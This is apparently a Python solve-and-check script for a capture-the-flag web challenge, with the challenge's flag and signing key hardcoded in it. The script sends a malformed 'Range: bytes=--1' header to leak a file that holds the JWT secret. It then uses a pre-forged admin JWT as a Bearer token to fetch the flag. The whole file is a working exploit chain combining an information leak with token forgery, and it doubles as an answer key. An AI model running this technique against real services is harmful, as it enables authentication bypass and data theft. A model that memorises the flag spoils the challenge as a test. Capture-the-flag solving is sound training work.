import sys
import base64
import hmac
import hashlib
import requests

HOST="127.0.0.1"
PORT=8080
FLAG="magpie{G0_T3LL_1T_0N_TH3_M0UNT41N_TH4T_JWT_W45_F0RM3D}"

def solve() -> bool:
    KEY="This is a super great secret key :)"
    URL = f"http://{HOST}:{PORT}/a_email_347314h12lkdh2001_2004_04_12.eml"
    r = requests.get(URL, headers={"Range": "bytes=--1"})

    if KEY not in r.text:
        print("-1")
        sys.exit(-1) # -1 is bad

    JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.fobD1QJqwechlJuRtcBLdSS9IU0vxbFZJgAH6fMZYtA"

    URL = f"http://{HOST}:{PORT}/flag"
    r = requests.get(URL, headers={"Authorization": f"Bearer {JWT}"})
    return FLAG in r.text

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = sys.argv[2]
        #print("Checking on " + HOST)
    #else:
        #print("Checking on http://127.0.0.1/")

    print(solve())

if __name__ == "__main__": main()
